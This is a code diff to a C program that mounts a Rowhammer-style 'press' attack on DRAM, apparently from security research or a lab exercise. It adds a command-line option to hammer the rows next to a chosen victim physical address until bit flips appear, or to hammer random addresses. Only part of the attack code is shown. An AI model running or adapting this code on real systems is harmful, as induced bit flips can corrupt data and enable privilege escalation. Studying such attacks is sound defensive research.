@@ -45,8 +45,7 @@ uint32_t press(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t 
     return number_of_bitflips_in_target; 
 }
 
-int main(int argc, char **argv) {
-    setvbuf(stdout, NULL, _IONBF, 0);
+void press_all() {
     uint64_t mem_size = 1.8 * BUFFER_SIZE_MB;
     allocated_mem = allocate_pages(mem_size);
     setup_PPN_VPN_map(allocated_mem, mem_size);
@@ -62,6 +61,58 @@ int main(int argc, char **argv) {
             uint32_t num_bit_flips = press(victim, *attacker_1, *attacker_2);
             if (num_bit_flips > 0) break;
         }
+    }
+}
+
+void press_one(uint64_t victim) {
+    // allocate only 40% of physical mem
+    uint64_t mem_size = 0.8 * BUFFER_SIZE_MB;
+    allocated_mem = allocate_pages(mem_size);
+    setup_PPN_VPN_map(allocated_mem, mem_size);
+
+    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
+    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 
+
+    while (true) {
+        void *temp = allocate_pages(mem_size);
+        deallocate_pages(allocated_mem, mem_size);
+        allocated_mem = temp;
+        setup_PPN_VPN_map(allocated_mem, mem_size);
+
+        // row + 1, row - 1
+        if (get_addresses_to_hammer(victim, attacker_1, attacker_2, 1)) {
+            uint32_t num_bit_flips = press(victim, *attacker_1, *attacker_2);
+            if (num_bit_flips > 0) break;
+        }
+    }
+}
+
+int main(int argc, char **argv) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    
+    int opt;
+    bool flag_press_all = true;
+    uint64_t victim; 
+    while((opt = getopt(argc, argv, "hp:")) != -1)  
+    {  
+        switch(opt)  
+        {  
+            case 'p':   
+                victim = strtol(optarg, NULL, 10);
+                flag_press_all = false;
+                break; 
+            case 'h':
+            case '?':
+                printf("Usage: %s [-p]\n", argv[0]);
+                printf("-p\t specific victim physical address to attack\n");
+                printf("If no specific address is passed, it will try to press on random addresses until it finds a bit flip\n");  
+                exit(0);
+        }  
+    }
+    if (flag_press_all) {
+        press_all();
+    } else {
+        press_one(victim);
     }
 }
 
